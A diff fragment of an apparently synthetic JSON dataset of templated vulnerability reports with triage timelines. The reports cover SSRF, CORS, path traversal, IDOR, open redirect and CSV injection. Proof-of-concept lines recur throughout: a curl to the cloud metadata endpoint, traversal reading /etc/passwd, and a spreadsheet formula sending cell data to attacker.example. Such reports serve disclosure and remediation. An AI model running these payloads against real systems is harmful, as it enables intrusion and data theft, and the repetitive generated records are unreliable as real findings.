+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://pay.schneeconnect-mobility.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11864,7 +11955,8 @@
           "offset": "8d 14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://pay.schneeconnect-mobility.foo/import`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11988,7 +12080,8 @@
           "offset": "1d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12147,7 +12240,8 @@
           "offset": "7d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://app.schneeconnect-mobility.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12295,7 +12389,8 @@
           "offset": "4d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://pay.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12407,7 +12502,8 @@
           "offset": "2d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12546,7 +12642,8 @@
           "offset": "2d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schneeconnect-mobility.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12662,7 +12759,8 @@
           "offset": "1d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12793,7 +12891,8 @@
           "offset": "3d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://app.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12894,7 +12993,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.schneeconnect-mobility.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13004,7 +13104,8 @@
           "offset": "1d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://app.schneeconnect-mobility.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13111,7 +13212,8 @@
           "offset": "5d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13251,7 +13353,8 @@
           "offset": "2d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13379,7 +13482,8 @@
           "offset": "3d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13487,7 +13591,8 @@
           "offset": "2d 7h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.schneeconnect-mobility.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13574,7 +13679,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schneeconnect-mobility.foo/export`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13697,7 +13803,8 @@
           "offset": "5d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13848,7 +13955,8 @@
           "offset": "2d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schneeconnect-mobility.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13967,7 +14075,8 @@
           "offset": "6d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14115,7 +14224,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14247,7 +14357,8 @@
           "offset": "1d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14403,7 +14514,8 @@
           "offset": "5d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14503,7 +14615,8 @@
           "offset": "1d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14635,7 +14748,8 @@
           "offset": "3d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14754,7 +14868,8 @@
           "offset": "6d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.schneeconnect-mobility.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14861,7 +14976,8 @@
           "offset": "4d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.schneeconnect-mobility.foo/export`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15000,7 +15116,8 @@
           "offset": "5d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15127,7 +15244,8 @@
           "offset": "2d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.schneeconnect-mobility.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15271,7 +15389,8 @@
           "offset": "3d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15403,7 +15522,8 @@
           "offset": "4d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15506,7 +15626,8 @@
           "offset": "1d 17h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15631,7 +15752,8 @@
           "offset": "1d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
